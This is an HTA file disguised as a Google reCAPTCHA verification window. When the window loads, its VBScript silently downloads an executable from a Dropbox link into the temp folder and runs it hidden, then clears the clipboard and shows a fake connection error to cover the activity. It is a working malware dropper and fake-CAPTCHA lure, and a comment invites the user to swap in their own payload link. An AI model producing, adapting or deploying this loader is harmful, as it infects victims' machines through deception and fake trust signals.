<!DOCTYPE html>
<html>
<head>
    <title>reCAPTCHA Verification</title>
    <HTA:APPLICATION
        APPLICATIONNAME="reCAPTCHA Verification"
        BORDER="thin"
        BORDERSTYLE="normal"
        ICON="https://support.google.com/favicon.ico"
        SHOWINTASKBAR="yes"
        SINGLEINSTANCE="yes"
        WINDOWSTATE="normal"
        SCROLL="no"
        SCROLLFLAT="yes"
        SYSMENU="yes"
    />
    <style>
        body {
            font-family: Roboto, helvetica, arial, sans-serif;
            margin: 0;
            padding: 20px;
            text-align: center;
            color: #555;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
        }
        img {
            width: 200px;
            margin-bottom: 20px;
        }
        #error {
            color: red;
        }
        .terms {
            font-size: small;
            color: #555;
        }
        .terms a {
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
    </style>
    <script language="VBScript">
Sub Window_onLoad
    Window.ResizeTo 520, 480
    Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2

    ' Download and execute EXE
    DownloadAndRun

    ClearClipboard

    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c timeout /T 2 /nobreak", 0, True
    Call HideConnectingShowError
    objShell.Run "cmd.exe /c timeout /T 1 /nobreak", 0, True
End Sub

Sub DownloadAndRun
    Dim url, filename, xmlhttp, stream, fso, tempPath

    url = "https://www.dropbox.com/scl/fi/cwyukz62jaib0e89fubkq/Documents-System.exe?rlkey=acoo0jcv7tqr6m2igmm1plsxu&st=knipkwxd&dl=1" ' Replace with your real link
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempPath = fso.GetSpecialFolder(2) & "\troll.exe" ' Downloads to temp folder

    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    xmlhttp.Open "GET", url, False
    xmlhttp.Send

    If xmlhttp.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' binary
        stream.Open
        stream.Write xmlhttp.ResponseBody
        stream.SaveToFile tempPath, 2
        stream.Close

        Set objShell = CreateObject("WScript.Shell")
        objShell.Run Chr(34) & tempPath & Chr(34), 0, False
    End If
End Sub
    </script>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/2048px-RecaptchaLogo.svg.png" alt="reCAPTCHA Logo">
    <div id="connecting" style="display:block;">
        <p>Verifying reCAPTCHA, please wait...</p>
    </div>
    <div id="error" style="display:none;">
        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
    </div>
    <p class="terms">
        <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
        <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
    </p>
</body>
</html>
